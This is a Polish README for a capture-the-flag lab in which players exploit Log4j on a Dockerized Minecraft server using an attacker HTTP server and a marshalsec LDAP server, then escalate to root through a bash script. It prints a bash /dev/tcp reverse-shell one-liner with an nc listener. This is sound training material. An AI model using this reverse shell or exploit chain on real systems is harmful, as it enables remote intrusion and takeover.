# minecraft-ctf

## Wprowadzenie
Witamy w `minecraft-ctf`, wyjątkowym wyzwaniu CTF stworzonym specjalnie dla Was! Twoim zadaniem będzie zdobycie flagi, wykorzystując podatność Log4j oraz kilka innych narzędzi, a to wszystko co najlepsze, z użyciem gry, którą chyba każdy zna! Przygotuj się na fascynujące wyzwanie! Owocnego hackowania i udanej zabawy!

## Wymagania
- Java (jeśli jej nie masz, pobierz i zainstaluj)
- Docker
- Minecraft Launcher
- Jeśli pracujesz na Windowsie, koniecznym może się okazać WSL
- NetCat (nie dostępny na Windowsie, użyj WSL lub zainstaluj osobno)

## Szybki start
### Uruchamianie SKLauncher
1. Otwórz SKLauncher, który również znajduje się w repozytorium.
2. Wybierz tryb offline.
3. Kliknij '+' obok "Installations Manager".
4. Wybierz release 1.8.8, zapisz i naciśnij PLAY.

### Uruchomienie serwera Minecraft i reszty potrzebnych kontenerów
1. **Uruchom swój serwer Minecraft'a:**
   - Plik konfiguracyjny kontenera serwera mc znajduje się w katalogu `Minecraft-Log4j-Exploit`.
   - Po zbudowaniu kontenera i uruchomieniu, w trybie Multiplayer w grze, dodaj serwer pod adresem 127.0.0.1.

2. **Uruchom serwer http:**
   - Plik konfiguracyjny znajduje się w katalogu `codehttp`.

3. **Uruchom serwer LDAP:**
   - Dockerfile znajduje się w katalogu `marshalsec`.

<details>
<summary><b>Informacje o kontenerach</b></summary>
Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hacker je kontrolujesz. Nienależącym do Ciebie jest ten hostujący serwer Minecraft'a, do którego chcesz uzyskać dostęp. Pozostałe kontenery pomogą Ci w tej misji.
</details>

## Twoje zadanie
Wykorzystaj podatność starej wersji Log4j i inne narzędzia do zdobycia ukrytej flagi. Kod hostowany na httpcode musi być przygotowany i skompilowany. Znajdź i zmodyfikuj bashowy skrypt wykonywany z uprawnieniami roota. Jak uzyskasz uprawnienia roota, możesz odnaleźć w plikach kod, który następnie wpiszesz w serwerze Minecrafta. Jeśli kod okaże się poprawny - gratulacje hackerze/ko ;)

## Przydatne informacje

### Reverse Shell
```sh
# Nasłuchuj na porcie `5000` na swoim komputerze:
nc -l 5000

# Na komputerze ofiary:
bash -i >& /dev/tcp/[twoje IP]/5000 0>&1
```

### Budowanie obrazu:
```sh
# Stworzenie obrazu kontenera:
docker build . -t nazwa-obrazu

# Uruchomienie obrazu z przekierowaniem portów:
docker run -p 25565:25565 -ti
```

### Konfiguracja EOL w VSCode
```sh
# Jeśli pracujesz na Windowsie, konieczna może okazać się zmiana EOL - End Of Line:
- Otwórz `Minecraft-Log4j-Exploit/server/start_server.sh`.
- Użyj `CTRL + SHIFT + P`.
- Zmień `EOL sequence`.
```

## Przydatne komendy 

### Docker
```sh
docker build
docker run
docker ps
docker ps -a
docker kill <id>
docker remove <id>
docker image prune
docker container prune
```

## Credits
- [Minecraft-Log4j-Exploit](https://github.com/Justin-Garey/Minecraft-Log4j-Exploit) od Justina Gareya
- [marshalsec](https://github.com/mbechler/marshalsec) od Marcina Bechlera
- [Smallest Docker Image Static Website](https://lipanski.com/posts/smallest-docker-image-static-website) od Vladimira Lipanskiego


TODO:
lf w starcie
wejsc na server mc wpisac komende
jak zatrzymać bash -c reverse shell?
echo to wbudowana funkcja basha, a nie żadna binarka 
allready allocated port: docker desktop delete container, 
